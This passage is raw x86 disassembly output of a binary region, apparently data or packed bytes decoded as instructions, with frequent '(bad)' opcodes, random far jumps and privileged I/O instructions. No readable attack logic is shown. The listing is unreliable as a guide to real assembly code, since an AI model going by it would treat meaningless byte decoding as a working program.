  417a39:	and    eax,0x64c2c703
  417a3e:	xchg   esi,eax
  417a3f:	shl    BYTE PTR ds:0x30aa2cc3,cl
  417a45:	out    dx,al
  417a46:	mov    ch,0xe5
  417a48:	clc    
  417a49:	jecxz  0x417a07
  417a4b:	cwde   
  417a4c:	inc    ebp
  417a4d:	jp     0x417a04
  417a4f:	outs   dx,BYTE PTR ds:[esi]
  417a50:	jle    0x417a06
  417a52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a53:	leave  
  417a54:	xlat   BYTE PTR ds:[ebx]
  417a55:	test   edi,eax
  417a57:	mov    esp,0x3a448fb9
  417a5c:	pop    edi
  417a5d:	sub    eax,0x7e757b2e
  417a63:	adc    esi,edi
  417a65:	jmp    0x787eafae
  417a6a:	or     edx,DWORD PTR [edi]
  417a6c:	mov    cl,dl
  417a6e:	jge    0x417a71
  417a70:	xor    esp,DWORD PTR [esi+0x63]
  417a73:	sbb    DWORD PTR [edi+0x330cec08],esp
  417a79:	push   es
  417a7a:	pop    es
  417a7b:	jl     0x417a34
  417a7d:	xlat   BYTE PTR ds:[ebx]
  417a7e:	sub    DWORD PTR [edi],edx
  417a80:	lds    edi,FWORD PTR [edi+eax*1-0x757b780]
  417a87:	add    ah,BYTE PTR [edi+esi*1]
  417a8a:	xchg   esi,eax
  417a8b:	and    DWORD PTR [esi+0x6c819fb9],esi
  417a91:	xchg   ebp,eax
  417a92:	int    0x69
  417a94:	repz cmc 
  417a96:	pop    eax
  417a97:	(bad)  
  417a98:	test   eax,0x7c6c8cf6
  417a9d:	sbb    BYTE PTR [edi+0x5a7048f6],bh
  417aa3:	add    esi,edi
  417aa5:	pop    ebx
  417aa6:	repnz or ch,BYTE PTR [eax+0x45516bc5]
  417aad:	inc    ebp
  417aae:	mov    es,edx
  417ab0:	sub    DWORD PTR [edx+0x51ac8d48],0xfffffff6
  417ab7:	sar    ebx,0x7e
  417aba:	ret    0x2a67
  417abd:	cdq    
  417abe:	(bad)  
  417abf:	out    0xc9,al
  417ac1:	scas   eax,DWORD PTR es:[edi]
  417ac2:	in     eax,0xab
  417ac4:	mov    al,0xf3
  417ac6:	jmp    0x86bd:0x223f369e
  417acd:	cmp    BYTE PTR [edi+0x3c9b427a],al
  417ad3:	in     al,dx
  417ad4:	in     eax,dx
  417ad5:	mov    DWORD PTR [edi+0x11],ebx
  417ad8:	das    
  417ad9:	daa    
  417ada:	adc    BYTE PTR [ebx],dl
  417adc:	pop    eax
  417add:	(bad)  
  417ade:	adc    al,0x7c
  417ae0:	repnz mov bh,0x17
  417ae3:	pop    es
  417ae4:	inc    ebp
  417ae5:	lea    ebp,[edx+0x65cdc7fb]
  417aeb:	lea    eax,[esi]
  417aed:	ja     0x417a7e
  417aef:	pushf  
  417af0:	ins    DWORD PTR es:[edi],dx
  417af1:	sbb    al,0x6a
  417af3:	xchg   edx,eax
  417af4:	inc    edi
  417af5:	cmp    eax,0x7168c436
  417afa:	retf   0xed66
  417afd:	jbe    0x417ad3
  417aff:	arpl   WORD PTR [edi-0x34],ax
  417b02:	xchg   esp,eax
  417b03:	ins    BYTE PTR es:[edi],dx
  417b04:	bound  edi,QWORD PTR [edi+ecx*4]
  417b07:	fsubr  QWORD PTR [ebp+esi*4+0x57316f4f]
  417b0e:	data16 js 0x417a9c
  417b11:	std    
  417b12:	(bad)  
  417b13:	and    BYTE PTR [edx+0x9],cl
  417b16:	adc    DWORD PTR [eax+0x645961a],ebx
  417b1c:	cwde   
  417b1d:	mov    dl,0xb5
  417b1f:	mov    ebx,0x84f1dc5d
  417b24:	inc    ebx
  417b25:	(bad)  [esi-0x68]
  417b28:	sbb    dh,BYTE PTR [ebp+0x52840fc4]
  417b2e:	sbb    al,0xdd
  417b30:	imul   ecx,DWORD PTR [edx-0x46],0x79
  417b34:	aam    0x83
  417b36:	push   es
  417b37:	and    eax,0x899daaa2
  417b3c:	(bad)  
  417b3d:	cmp    BYTE PTR [ebp-0x5b],bh
  417b40:	in     eax,0xa8
  417b42:	sbb    bh,BYTE PTR [esi]
  417b44:	fmul   QWORD PTR [ebp+0x32]
  417b47:	out    dx,eax
  417b48:	pop    esp
  417b49:	xchg   esp,eax
  417b4a:	jns    0x417bc2
  417b4c:	pop    ss
  417b4d:	xor    ch,BYTE PTR [eax+0x31b62485]
  417b53:	xchg   edi,eax
  417b54:	adc    esi,ebp
  417b56:	inc    eax
  417b57:	ins    BYTE PTR es:[edi],dx
  417b58:	xor    BYTE PTR cs:[edx+0x28],ch
  417b5c:	dec    ebx
  417b5d:	jo     0x417b05
  417b5f:	leave  
  417b60:	mov    WORD PTR [edi+ebp*1],gs
  417b63:	adc    BYTE PTR [esp+edx*1-0x19],bh
  417b67:	scas   al,BYTE PTR es:[edi]
  417b68:	lahf   
  417b69:	inc    ebp
  417b6a:	(bad)  
  417b6b:	mov    eax,ds:0x2849a593
  417b70:	call   0x90ecdf03
  417b75:	test   eax,0xa14e137f
  417b7a:	push   ss
  417b7b:	push   0x59a247be
  417b80:	(bad)  
  417b81:	fucom  st(3)
  417b83:	loop   0x417bba
  417b85:	sbb    ebp,DWORD PTR [esi-0x7459a8f]
  417b8b:	mov    BYTE PTR [ecx+ecx*2-0x76f71258],cl
  417b92:	xlat   BYTE PTR ds:[ebx]
  417b93:	xor    DWORD PTR [edi],ecx
  417b95:	int    0x32
  417b97:	jl     0x417bf9
  417b99:	adc    dh,ch
  417b9b:	push   ebx
  417b9c:	lds    edi,FWORD PTR [ecx-0x12]
  417b9f:	adc    ebp,DWORD PTR [ebp+0x41]
  417ba2:	adc    bl,BYTE PTR [eax-0x35718be]
  417ba8:	std    
  417ba9:	push   ebx
  417baa:	sub    dh,BYTE PTR [ebx]
  417bac:	xchg   dx,ax
  417bae:	test   al,0xef
  417bb0:	(bad)  
  417bb1:	(bad)  
  417bb3:	inc    ebx
  417bb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bb6:	(bad)
  417bba:	xchg   ebp,eax
  417bbb:	sbb    edi,esi
  417bbd:	test   eax,0x41665298
  417bc2:	stos   DWORD PTR es:[edi],eax
  417bc3:	mov    eax,0x67460b03
  417bc8:	sbb    al,0x23
  417bca:	push   es
  417bcb:	lods   al,BYTE PTR ds:[esi]
  417bcc:	jmp    0xd974:0xb6dd4764
  417bd3:	xor    al,0x17
  417bd5:	ss sti 
  417bd7:	dec    ecx
  417bd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bd9:	mov    ds:0xddc03e19,al
  417bde:	lock push eax
  417be0:	loope  0x417c0f
  417be2:	xchg   edi,eax
  417be3:	lock ficomp DWORD PTR [eax]
  417be6:	mov    dh,0x49
  417be8:	js     0x417b6d
  417bea:	ret    
  417beb:	rcr    esp,cl
  417bed:	scas   eax,DWORD PTR es:[edi]
  417bee:	inc    ebx
  417bef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bf0:	or     BYTE PTR [edx+0x19],al
  417bf3:	jnp    0x417c6c
  417bf5:	pop    es
  417bf6:	popf   
  417bf7:	and    bl,ch
  417bf9:	jl     0x417c15
  417bfb:	mov    eax,ds:0xa5cdad0
  417c00:	pop    edx
  417c01:	(bad)  
  417c02:	xor    BYTE PTR ss:[edi+0x2d],ch
  417c06:	outs   dx,BYTE PTR ds:[esi]
  417c07:	sar    DWORD PTR [edx+0xc],0xd0
  417c0b:	iret   
  417c0c:	adc    ecx,DWORD PTR [ebp-0x4d09476f]
  417c12:	sub    al,0x23
  417c14:	adc    dh,BYTE PTR [ebp+0x1a06e55e]
  417c1a:	xchg   edx,eax
  417c1b:	icebp  
  417c1c:	mov    bl,ch
  417c1e:	push   ecx
  417c1f:	cli    
  417c20:	hlt    
  417c21:	rcl    DWORD PTR [ecx-0x438024e],0x27
  417c28:	pop    esp
  417c29:	cld    
  417c2a:	out    0x5d,eax
  417c2c:	scas   eax,DWORD PTR es:[edi]
  417c2d:	pop    ebp
  417c2e:	arpl   WORD PTR ss:[ebx],dx
  417c31:	out    0xb1,eax
  417c33:	cmp    eax,0xbcb08f3a
  417c38:	pop    ds
  417c39:	sub    eax,0xdd3d8f2e
  417c3e:	xchg   esp,eax
  417c3f:	call   0xd103:0xdcca4102
  417c46:	(bad)  
  417c47:	and    eax,0xffb31b5e
  417c4c:	hlt    
  417c4d:	ficomp DWORD PTR [ebx]
  417c4f:	bound  ebx,QWORD PTR [edi]
  417c51:	mov    ecx,0x414d06b1
  417c56:	shl    DWORD PTR [edx-0x41b80cb8],1
  417c5c:	xchg   bl,bl
  417c5e:	xchg   BYTE PTR [esi+0x75],al
  417c61:	cld    
  417c62:	into   
  417c63:	arpl   WORD PTR [ecx+0x28bae210],ax
  417c69:	scas   eax,DWORD PTR es:[edi]
  417c6a:	pop    edx
  417c6b:	xor    BYTE PTR [edx+0x76],al
  417c6e:	(bad)  [esi+edi*8-0x5f]
  417c72:	inc    ecx
  417c73:	xor    DWORD PTR ss:[edi],edi
  417c76:	mov    ecx,0xc34954ac
  417c7b:	dec    eax
  417c7c:	mov    eax,ds:0xe48c78ef
  417c81:	jmp    0x417c76
  417c83:	retf   0xb4f8
  417c86:	data16 mov ah,0x6c
  417c89:	and    edx,DWORD PTR [edx]
  417c8b:	shr    ah,1
  417c8d:	cli    
  417c8e:	jns    0x417cba
  417c90:	and    DWORD PTR [esi+0x15b63d06],esp
  417c96:	mov    ebx,0x2e3a6d55
  417c9b:	jge    0x417c1f
  417c9d:	test   eax,0x7f64c34e
  417ca2:	sbb    BYTE PTR ds:0x65676b65,ah
  417ca8:	pop    ebx
  417ca9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417caa:	push   ss
  417cab:	shl    bh,0xb6
  417cae:	rol    BYTE PTR [eax],0x3d
  417cb1:	repz div edi
  417cb4:	aad    0x98
  417cb6:	fs pop eax
  417cb8:	cmp    BYTE PTR [eax],ch
  417cba:	fisub  WORD PTR [edi-0x1f]
  417cbd:	push   eax
  417cbe:	xchg   DWORD PTR ds:0xc59095b4,ebx
  417cc4:	or     eax,0x64f95c09
  417cc9:	pop    DWORD PTR [edx+0x55]
  417ccc:	bound  eax,QWORD PTR [ecx+0x68fe69df]
  417cd2:	or     eax,edx
  417cd4:	lock imul ebp,DWORD PTR [edx],0x91ffc4a3
  417cdb:	push   edx
  417cdc:	inc    edi
  417cdd:	test   eax,0x2f7a8ce9
  417ce2:	mov    al,0x36
  417ce4:	iret   
  417ce5:	jl     0x417ce0
  417ce7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ce8:	call   0xc91e:0x8fe1a02b
  417cef:	sbb    al,0x15
  417cf1:	and    ebx,DWORD PTR ds:0xfba70aef
  417cf7:	mov    ds,ebx
  417cf9:	leave  
  417cfa:	inc    ebp
  417cfb:	sub    eax,DWORD PTR [ecx]
  417cfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cfe:	std    
  417cff:	pop    ss
  417d00:	shl    dl,cl
  417d02:	push   es
  417d03:	push   eax
  417d04:	enter  0x5011,0x41
  417d08:	inc    ebx
  417d09:	xchg   ebx,eax
  417d0a:	pop    edi
  417d0b:	test   esp,0xabac9d8
  417d11:	in     al,dx
  417d12:	mov    al,ds:0xf6e1d23
  417d17:	test   BYTE PTR [ebx+0x44],bh
  417d1a:	retf   
  417d1b:	je     0x417d44
  417d1d:	dec    ebx
  417d1e:	inc    eax
  417d1f:	xchg   edi,eax
  417d20:	mov    edx,0xf658410d
  417d25:	xchg   BYTE PTR [ebp-0x1e],ch
  417d28:	mov    bh,0x6e
  417d2a:	call   0x798e8117
  417d2f:	cmp    ebp,DWORD PTR [edi]
  417d31:	jmp    0x340f:0x735f3ad3
  417d38:	imul   edi,DWORD PTR [eax],0x486bd6ed
  417d3e:	(bad)
  417d42:	xor    ah,BYTE PTR [ebx+0x50]
  417d45:	das    
  417d46:	lods   al,BYTE PTR ds:[esi]
  417d47:	jp     0x417dc2
  417d49:	pop    ds
  417d4a:	sub    DWORD PTR [ebp+0xe],0xcb600fa0
  417d51:	dec    eax
  417d52:	xchg   esp,eax
  417d53:	in     eax,dx
  417d54:	sar    DWORD PTR [esp+edx*4+0x9],1
  417d58:	jg     0x417d11
  417d5a:	ja     0x417dca
  417d5c:	mov    cl,0x47
  417d5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d5f:	(bad)
  417d63:	fisttp DWORD PTR ds:0x354d7390
  417d69:	add    al,0x42
  417d6b:	adc    al,0xeb
  417d6d:	les    eax,FWORD PTR [ecx-0x67f321cf]
  417d73:	dec    esi
  417d74:	mul    BYTE PTR [eax]
  417d76:	std    
  417d77:	not    BYTE PTR [ebx-0x631b682a]
  417d7d:	mov    ch,BYTE PTR [ecx-0x687a4ca1]
  417d83:	out    dx,eax
  417d84:	cmp    DWORD PTR [esi],edi
  417d86:	cmp    al,0x8d
  417d88:	mov    edx,eax
  417d8a:	mov    al,ds:0x3d24480
  417d8f:	jmp    0x3510:0x83cf9b43
  417d96:	or     al,0x73
  417d98:	sti    
  417d99:	xor    bl,al
  417d9b:	cwde   
  417d9c:	stos   DWORD PTR es:[edi],eax
  417d9d:	data16 test BYTE PTR ds:0x8a5f9f5c,al
  417da4:	dec    ebx
  417da5:	jns    0x417dc5
  417da7:	es dec ebx
  417da9:	xchg   DWORD PTR [ecx],edx
  417dab:	je     0x417d5f
  417dad:	fsubr  st(2),st
  417daf:	mov    ecx,0x23f13329
  417db4:	xchg   edi,eax
  417db5:	ja     0x417d8c
  417db7:	add    BYTE PTR [edi+0x2388a40e],0x31
  417dbe:	or     DWORD PTR [edi],edi
  417dc0:	add    DWORD PTR [edi-0x6d654056],eax
  417dc6:	lock xlat BYTE PTR ds:[ebx]
  417dc8:	(bad)  
  417dc9:	icebp  
  417dca:	push   0xa1097c2d
  417dcf:	in     eax,dx
  417dd0:	(bad)  
  417dd1:	out    0xbf,eax
  417dd3:	mov    dl,0xa
  417dd5:	or     ah,ah
  417dd7:	bound  esi,QWORD PTR [eax-0x8]
  417dda:	repnz mov cl,0xb1
  417ddd:	div    ah
  417ddf:	repz (bad) 
  417de1:	ja     0x417dc4
  417de3:	inc    ecx
  417de4:	mov    ch,0x33
  417de6:	push   0x1ac5d153
  417deb:	mov    edi,0x139bf6f2
  417df0:	and    dl,BYTE PTR [ecx-0x72]
  417df3:	mov    edx,0xe9ad714f
  417df8:	imul   di,WORD PTR [ebp+0x63],0xfffc
  417dfd:	sub    al,0xd
  417dff:	(bad)  
  417e00:	neg    BYTE PTR [edi]
  417e02:	sti    
  417e03:	pusha  
  417e04:	sar    DWORD PTR [esi],1
  417e06:	adc    al,0x80
  417e08:	mov    dl,0x20
  417e0a:	push   ebp
  417e0b:	jecxz  0x417e47
  417e0d:	sbb    ebx,DWORD PTR [ebp+eiz*4-0x30ac5e99]
  417e14:	xchg   di,ax
  417e16:	xor    dl,dl
  417e18:	pop    ds
  417e19:	jo     0x417e98
  417e1b:	pop    eax
  417e1c:	lock mov edx,DWORD PTR [ebx+0x20aa9231]
  417e23:	mov    fs,WORD PTR [eax+0x63]
  417e26:	cs add eax,0x67e49a25
  417e2c:	pop    ds
  417e2d:	ins    BYTE PTR es:[edi],dx
  417e2e:	in     al,0x1a
  417e30:	mov    cl,0xd7
  417e32:	and    esi,eax
  417e34:	jo     0x417e53
  417e36:	retf   0xf5eb
  417e39:	lahf   
  417e3a:	push   ebp
  417e3b:	push   ebp
  417e3c:	mov    ebx,0x2f172ead
  417e41:	fcomp  DWORD PTR [eax+0x48bd9192]
  417e47:	cmp    DWORD PTR ds:0x710fbf54,eax
  417e4d:	xor    eax,0x84f6e11f
  417e52:	adc    BYTE PTR [ecx+0x7a7bd436],ch
  417e58:	loopne 0x417eb8
  417e5a:	mov    eax,ds:0xfe5f3135
  417e5f:	lock icebp 
  417e61:	ret    
  417e62:	xchg   BYTE PTR [edi+0xd],dh
  417e65:	adc    ecx,DWORD PTR [ecx]
  417e67:	sub    edi,DWORD PTR [ecx+0x5a166faa]
  417e6d:	cmp    BYTE PTR [ecx-0x2e1ca54a],dh
  417e73:	ss cdq 
  417e75:	stos   DWORD PTR es:[edi],eax
  417e76:	inc    edi
  417e77:	ret    0xb58e
  417e7a:	in     al,0xd2
  417e7c:	retf   
  417e7d:	jle    0x417e7b
  417e7f:	and    al,dl
  417e81:	test   ebx,0xc44ca90e
  417e87:	cmp    esp,DWORD PTR [edx]
  417e89:	mov    esp,0x7a18d65d
  417e8e:	int    0x23
  417e90:	sbb    esi,DWORD PTR [ecx+0x5ca29bf5]
  417e96:	es dec edx
  417e98:	aam    0x34
  417e9a:	cmp    eax,0x3f304003
  417e9f:	test   BYTE PTR [esi],dh
  417ea1:	inc    ebp
  417ea2:	xchg   edi,eax
  417ea3:	ret    
  417ea4:	add    cl,BYTE PTR [ebp-0x7e2398fe]
  417eaa:	push   ds
  417eab:	dec    edi
  417eac:	add    al,0x30
  417eae:	mov    DWORD PTR [ebx],0xacaa97bc
  417eb4:	cs shl ch,cl
  417eb7:	mov    bl,0xbd
  417eb9:	cld    
  417eba:	push   edi
  417ebb:	push   es
  417ebc:	int3   
  417ebd:	pop    ds
  417ebe:	cli    
  417ebf:	cmp    BYTE PTR [ebx+ecx*2],ah
  417ec2:	mov    al,0x8c
  417ec4:	enter  0xb61c,0x5
  417ec8:	fidiv  DWORD PTR [edi]
  417eca:	push   esi
  417ecb:	xor    al,0x1f
  417ecd:	inc    esp
  417ece:	push   eax
  417ecf:	stc    
  417ed0:	xchg   BYTE PTR [edx+0x74],dh
  417ed3:	xor    DWORD PTR [eax+0x23c080c8],edx
  417ed9:	push   ss
  417eda:	dec    ecx
  417edb:	adc    al,0xf5
  417edd:	aad    0x60
  417edf:	and    DWORD PTR [edx-0x670fb272],ebp
  417ee5:	mov    BYTE PTR [ebx-0x1f],bl
  417ee8:	adc    dl,bl
  417eea:	xchg   edi,eax
  417eeb:	mov    ds:0xd87030a7,al
  417ef0:	fld    QWORD PTR [esi+edi*4-0x73]
  417ef4:	sar    edx,0x3e
  417ef7:	mov    ebx,0xd56ace9e
  417efc:	loopne 0x417e82
  417efe:	mov    BYTE PTR [ebx],bh
  417f00:	xor    al,0x81
  417f02:	outs   dx,DWORD PTR ds:[esi]
  417f03:	jae    0x417f01
  417f05:	test   al,0x66
  417f07:	test   eax,0xe3300235
  417f0c:	mov    esp,0x29f2b575
  417f12:	ins    DWORD PTR es:[edi],dx
  417f13:	jl     0x417f3c
  417f15:	jl     0x417f32
  417f17:	stos   BYTE PTR es:[edi],al
  417f18:	cwde   
  417f19:	and    BYTE PTR [esi-0x6795ebc7],al
  417f1f:	int    0x5d
  417f21:	mov    al,0xbf
  417f23:	nop
  417f24:	lods   al,BYTE PTR ds:[esi]
  417f25:	shl    BYTE PTR [esi+0x63],1
  417f28:	sbb    BYTE PTR [edi+0x2ce1dc2f],cl
  417f2e:	inc    ebx
  417f2f:	cmp    eax,DWORD PTR [ebx-0x7ef4e53b]
  417f35:	jns    0x417f84
  417f37:	mov    edi,0x9786020b
  417f3c:	aaa    
  417f3d:	xchg   DWORD PTR [eax],ecx
  417f3f:	lahf   
  417f40:	xlat   BYTE PTR ds:[ebx]
  417f41:	cmp    BYTE PTR [eax],dh
  417f43:	jo     0x417fb7
  417f45:	xchg   ebx,eax
  417f46:	mov    bl,0x7f
  417f48:	cmp    bl,BYTE PTR [ecx]
  417f4a:	imul   edx,esi,0x33
  417f4d:	mov    eax,0x71aab991
  417f52:	pop    eax
  417f53:	xor    eax,0x25568c89
  417f58:	fstp   QWORD PTR [edi+0x7f]
  417f5b:	push   ebx
  417f5c:	inc    esi
  417f5d:	hlt    
  417f5e:	(bad)  
  417f5f:	fcom   DWORD PTR [edi+0x18]
  417f62:	repnz xor al,0x3c
  417f65:	sti    
  417f66:	aas    
  417f67:	adc    BYTE PTR [ebp-0x45],0xdf
  417f6b:	mov    ah,BYTE PTR [ebp+edi*8+0x4c]
  417f6f:	pop    ss
  417f70:	js     0x417fa5
  417f72:	jge    0x417f58
  417f74:	mov    esp,0x95faa7d
  417f79:	jbe    0x417f13
  417f7b:	int    0x19
  417f7d:	adc    DWORD PTR [ebx+0x1c],eax
  417f80:	inc    edx
  417f81:	loope  0x417ff7
  417f83:	imul   eax,DWORD PTR [ecx-0x38e38c47],0xef9864d6
  417f8d:	dec    esp
  417f8e:	pop    esp
  417f8f:	stc    
  417f90:	mov    ebx,0x5ce1a084
  417f95:	pushf  
  417f96:	inc    ecx
  417f97:	xchg   DWORD PTR [edx],ebp
  417f99:	sbb    ecx,esp
  417f9b:	rcr    BYTE PTR [edx*8-0x69717283],0x64
  417fa3:	or     ebx,DWORD PTR [esi]
  417fa5:	mov    bl,0xa0
  417fa7:	push   es
  417fa8:	rcr    DWORD PTR ds:[esi+esi*8-0x61b326ec],0x15
  417fb1:	scas   eax,DWORD PTR es:[edi]
  417fb2:	push   0x1e292323
  417fb7:	jo     0x417f93
  417fb9:	sbb    BYTE PTR [edx+eiz*2],cl
  417fbc:	sbb    al,0x1d
  417fbe:	out    0x2e,eax
  417fc0:	mov    esi,0x49744c22
  417fc5:	push   ds
  417fc6:	test   BYTE PTR [eax-0x59],0xa8
  417fca:	jbe    0x417fac
  417fcc:	shr    DWORD PTR [edi+0x2ba3a070],cl
  417fd2:	push   cs
  417fd3:	jle    0x417f8a
  417fd5:	test   BYTE PTR [ebx-0xd9fa8df],0x93
  417fdc:	rcl    BYTE PTR [ebp+0x492deb98],cl
  417fe2:	out    0x81,eax
  417fe4:	dec    ecx
  417fe5:	mov    edi,ebp
  417fe7:	pop    ebp
  417fe8:	(bad)  
  417fea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417feb:	mov    edi,ecx
  417fed:	rcr    DWORD PTR [ecx-0x33],cl
  417ff0:	jbe    0x417fd3
  417ff2:	inc    edi
  417ff3:	inc    ebp
  417ff4:	adc    dl,bl
  417ff6:	jmp    DWORD PTR [esp+ebx*8+0x55f2f6dd]
  417ffd:	adc    BYTE PTR [ecx],dl
  417fff:	add    al,0x3a
  418001:	sti    
  418002:	rol    BYTE PTR ds:0xe5a414bc,cl
  418008:	or     al,0x63
  41800a:	xchg   ecx,eax
  41800b:	sahf   
  41800c:	mov    bh,BYTE PTR es:[edi-0x1d]
  418010:	jmp    0x509b:0xa044559
  418017:	mov    ds:0xa022448c,eax
  41801c:	jmp    0xa93f:0x488a0203
  418023:	jne    0x418087
  418025:	jne    0x418038
  418027:	test   eax,0x15e6391b
  41802c:	test   cl,bl
  41802e:	stos   DWORD PTR es:[edi],eax
  41802f:	cld    
  418030:	push   esp
  418031:	xchg   ebp,eax
  418032:	jno    0x417fc1
  418034:	xor    BYTE PTR [ecx-0x18],dl
  418037:	test   DWORD PTR [esi],ecx
  418039:	cmp    BYTE PTR [ebp+ebp*4-0x1e],dl
  41803d:	(bad)  
  41803e:	in     al,0x83
  418040:	cld    
  418041:	fdivr  QWORD PTR [eax-0x666ceeab]
  418047:	ret    0x90c4
  41804a:	rol    BYTE PTR [ebp+eiz*4+0xc],0x3b
  41804f:	retf   0x32a5
  418052:	jle    0x4180b3
  418054:	ja     0x4180bd
  418056:	jl     0x41803c
  418058:	xor    edx,ecx
  41805a:	dec    esi
  41805b:	dec    eax
  41805c:	loope  0x41806b
  41805e:	push   ecx
  41805f:	stos   DWORD PTR es:[edi],eax
  418060:	sub    BYTE PTR [edx],0xf5
  418063:	ja     0x418004
  418065:	leave  
  418066:	mov    BYTE PTR [esi],dl
  418068:	in     eax,dx
  418069:	mov    eax,DWORD PTR [eax]
  41806b:	xor    esi,DWORD PTR [ebp+0x32ffaa89]
  418071:	xchg   ecx,eax
  418072:	stc    
  418073:	xchg   ebx,eax
  418074:	lea    ebx,[edx]
  418076:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418077:	mov    es,WORD PTR [ecx-0x1b]
  41807a:	dec    ecx
  41807b:	xchg   edi,eax
  41807c:	and    al,0x6
  41807e:	cmp    DWORD PTR [edi+0x29],esp
  418081:	dec    edx
  418082:	loopne 0x41807c
  418084:	call   0x985c821b
  418089:	add    DWORD PTR ss:[ebx-0x53],ebx
  41808d:	mov    ebx,0xa373f4cf
  418092:	xor    ebp,edi
  418094:	test   eax,0x5437cee
  418099:	(bad)  
  41809a:	adc    BYTE PTR [eax],bh
  41809c:	lods   eax,DWORD PTR ds:[esi]
  41809d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41809e:	shl    DWORD PTR [edi-0x757af34c],cl
  4180a4:	mov    dl,0x96
  4180a6:	cwde   
  4180a7:	ds xchg esp,eax
  4180a9:	dec    eax
  4180aa:	repnz cmp eax,0xcdf00876
  4180b0:	(bad)  
  4180b1:	jmp    0x8e60bf4b
  4180b6:	lods   eax,DWORD PTR ds:[esi]
  4180b7:	pop    ebp
  4180b8:	xor    eax,0xbb5c44a6
  4180bd:	and    ah,BYTE PTR [eax-0x6ce6281]
  4180c3:	sti    
  4180c4:	cli    
  4180c5:	daa    
  4180c6:	enter  0x19bb,0xb8
  4180ca:	out    dx,al
  4180cb:	rol    bh,cl
  4180cd:	neg    BYTE PTR [esi+eiz*2-0x4296296e]
  4180d4:	adc    al,0xa9
  4180d6:	rol    dl,0x34
  4180d9:	ret    
  4180da:	jp     0x4180ba
  4180dc:	mov    BYTE PTR [edx+0x1f],ch
  4180df:	aaa    
  4180e0:	jno    0x41813b
  4180e2:	inc    eax
  4180e3:	daa    
  4180e4:	ret    
  4180e5:	sbb    eax,0xf5b1dcda
  4180ea:	je     0x418100
  4180ec:	mov    esi,0x72ecaa5d
  4180f1:	cmp    eax,0xedc66653
  4180f6:	jg     0x418137
  4180f8:	jge    0x418171
  4180fa:	jns    0x4180cc
  4180fc:	js     0x418081
  4180fe:	pop    es
  4180ff:	loope  0x4180dd
  418101:	push   eax
  418102:	push   eax
  418103:	sar    ch,cl
  418105:	dec    ebp
  418106:	rcr    DWORD PTR [edx],0x1e
  418109:	adc    dh,ch
  41810b:	idiv   DWORD PTR [eax]
  41810d:	pop    edi
  41810e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41810f:	inc    edi
  418110:	or     eax,0x3b82c41c
  418115:	shl    DWORD PTR [ecx],cl
  418117:	(bad)  
  418118:	aam    0x4a
  41811a:	daa    
  41811b:	aam    0xaf
  41811d:	jmp    0x530b:0xd6d44358
  418124:	rcr    BYTE PTR [edi],cl
  418126:	(bad)  
  418127:	mov    ebp,0xb8672648
  41812c:	and    eax,0xdf03749
  418131:	mov    ds:0xd02161b1,al
  418136:	cmp    ebp,esi
  418138:	inc    edi
  418139:	int    0x10
  41813b:	inc    edi
  41813c:	je     0x418103
  41813e:	inc    esp
  41813f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418140:	jns    0x41818a
  418142:	sbb    BYTE PTR [ebx-0x54],al
  418145:	mov    dh,0x4e
  418147:	jo     0x418190
  418149:	imul   ebx,DWORD PTR [esi],0xffffffb1
  41814c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41814d:	push   eax
  41814e:	les    esi,FWORD PTR [esi]
  418150:	pusha  
  418151:	add    ch,bl
  418153:	mov    ch,0x7d
  418155:	sbb    eax,0xd1cd284b
  41815a:	outs   dx,DWORD PTR ds:[esi]
  41815b:	scas   al,BYTE PTR es:[edi]
  41815c:	mov    ah,0x2b
  41815e:	test   DWORD PTR [ebx+eax*1-0x17],ebx
  418162:	in     al,0x89
  418164:	dec    esp
  418165:	mov    esp,0xc66353fa
  41816a:	add    edi,esi
  41816c:	xor    ecx,DWORD PTR [ebp+0x545111bf]
  418172:	xchg   ecx,eax
  418173:	jb     0x418177
  418175:	mov    ah,0x26
  418177:	pop    ds
  418178:	outs   dx,BYTE PTR ds:[esi]
  418179:	jl     0x4181d2
  41817b:	loop   0x418188
  41817d:	dec    edx
  41817e:	and    BYTE PTR [edx+edx*4+0x33],ah
  418182:	(bad)  [esi]
  418184:	push   esp
  418185:	leave  
  418186:	sub    al,0x18
  418188:	jbe    0x4181a2
  41818a:	push   0x2c58225
  41818f:	test   eax,0x3e02dfee
  418194:	pop    ds
  418195:	jns    0x4181b3
  418197:	gs daa 
  418199:	aas    
  41819a:	(bad)  
  41819b:	cmp    esi,edi
  41819d:	xchg   esp,eax
  41819e:	cld    
  41819f:	retf   
  4181a0:	sbb    edx,esp
  4181a2:	xor    eax,DWORD PTR [esi+ecx*4]
  4181a5:	gs cmp eax,0x7fcc4091
  4181ab:	aam    0xe3
  4181ad:	repz xor DWORD PTR [eax-0x2b],edi
  4181b1:	mov    ebx,0x65652466
  4181b6:	push   esi
  4181b7:	mov    ebx,0x59d98949
  4181bc:	fdiv   QWORD PTR ds:0x48f5a23b
  4181c2:	test   eax,0x114119c0
  4181c7:	in     eax,0x6
  4181c9:	or     ebx,DWORD PTR [eax-0x13ae1e3b]
  4181cf:	ins    BYTE PTR es:[edi],dx
  4181d0:	xchg   edx,eax
  4181d1:	or     BYTE PTR [esi+0x53fc8a0e],dl
  4181d7:	push   es
  4181d8:	jecxz  0x41819e
  4181da:	or     WORD PTR [ebp+0x33],di
  4181de:	imul   ebx,DWORD PTR [ebp-0x74],0x27a5c4a2
  4181e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181e6:	test   al,0x31
  4181e8:	xchg   esp,eax
  4181e9:	and    DWORD PTR [ecx-0x7e],edi
  4181ec:	mov    ebx,0xbe44f054
  4181f1:	daa    
  4181f2:	xor    DWORD PTR [ebp+0x12],edi
  4181f5:	cld    
  4181f6:	jnp    0x418237
